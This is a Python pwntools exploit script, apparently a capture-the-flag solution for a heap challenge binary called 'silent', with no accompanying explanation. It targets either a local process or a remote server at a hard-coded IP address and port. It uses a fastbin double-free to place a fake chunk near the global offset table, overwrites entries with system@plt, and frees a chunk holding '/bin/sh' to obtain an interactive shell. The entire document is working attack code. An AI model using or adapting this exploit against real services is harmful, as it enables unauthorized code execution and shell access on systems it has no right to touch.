#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./silent")

else:
    io = remote("39.107.32.132", 10000)

elf = ELF("./silent")
#  libc = ELF("")

def DEBUG():
    #  print "pid -> {}".format(proc.pidof(io))
    raw_input("DEBUG: ")
    gdb.attach(io, "set follow-fork-mode parent")

def add(size, payload):
    io.sendline("1")
    sleep(0.1)
    io.sendline(str(size))
    sleep(0.1)
    io.sendline(payload)
    sleep(0.1)

def edit(idx, payload1, payload2):
    io.sendline("3")
    sleep(0.1)
    io.sendline(str(idx))
    sleep(0.1)
    io.sendline(payload1)
    sleep(0.1)
    io.sendline(payload2)
    sleep(0.1)

def delete(idx):
    io.sendline("2")
    sleep(0.1)
    io.sendline(str(idx))


if __name__ == "__main__":
    io.recvuntil("==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.\n\n\n")

    add(80, '0' * (80 - 1))
    add(80, '1' * (80 - 1))
    add(80, "/bin/sh\0".ljust(79, "\x01"))

    delete(0) # 0
    delete(1) # 1 -> 0
    delete(0) # 0 -> 1 -> 0

    fakeChunk = 0x601ffa

    add(80, p64(fakeChunk).ljust(79, "\x01")) # 0
    #  DEBUG()

    add(80, "2" * 79) # 1
    add(80, "3" * 79) # 0

    payload = 'a' * 6 + p64(0) + p64(elf.plt["system"]) * 2
    add(80, payload)
    #  DEBUG()

    delete(2)

    io.interactive()
    io.close()

